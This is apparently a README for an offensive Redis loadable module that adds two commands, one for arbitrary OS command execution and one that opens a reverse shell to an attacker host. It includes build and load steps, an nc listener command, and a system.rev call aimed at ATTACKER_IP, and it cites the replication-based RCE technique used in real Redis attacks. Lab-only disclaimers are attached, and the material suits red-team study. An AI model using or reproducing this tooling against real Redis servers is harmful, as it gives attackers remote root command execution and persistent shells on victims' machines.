# Redis System Module (RCE Exploits of Redis Based on Master-Slave Replication)
### Execute System Commands & Reverse Shell via Redis Module

This project is a custom **Redis Loadable Module** for research and educational use.  
It adds two dangerous but useful commands:

- `system.exec` — Execute arbitrary system commands  
- `system.rev` — Open a reverse shell to an attacker-controlled host

**Warning**  
This module is intended **ONLY** for:
- Red Team research  
- CVE development  
- Lab environments  
- Exploit PoC demonstrations  

Do **NOT** deploy on any production or internet-facing environment.

---

## Features

### 1. `system.exec <command>`
Executes arbitrary OS commands using `popen()` and returns the output back to Redis.

**Example:**
```bash
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)"
```

---

### 2. `system.rev <ip> <port>`
Opens a **reverse shell** to the specified IP:Port.

Internally:
- Creates a TCP socket  
- Connects to attacker listener  
- Redirects STDIN/STDOUT/STDERR (`dup2`)  
- Executes `/bin/sh` via `execve`  

---

## How to Build

```bash
gcc -fPIC -shared -o system.so module.c
```

For debugging:

```bash
gcc -fPIC -shared -o system.so module.c -g
```

---

## Load Module into Redis

### Temporary
```
redis-server --loadmodule ./system.so
```

### Runtime load
```
127.0.0.1:6379> MODULE LOAD ./system.so
```

### Permanent (redis.conf)
```
loadmodule /path/to/system.so
```

---

## Testing Commands

### Execute system commands
```bash
127.0.0.1:6379> system.exec "uname -a"
```

### Reverse shell
Attacker:
```bash
nc -lvnp 9001
```

Redis server:
```bash
127.0.0.1:6379> system.rev "ATTACKER_IP" "9001"
```

---

## Security Notes

This module is highly dangerous:
- Redis often runs as **root** on misconfigured systems  
- Anyone with Redis command execution can gain **instant RCE**  
- Same technique used in major real-world Redis exploitation campaigns  

Use ONLY in isolated lab environments.

---

## License

For **research, educational, penetration testing** use in controlled labs.  
User is responsible for lawful usage.
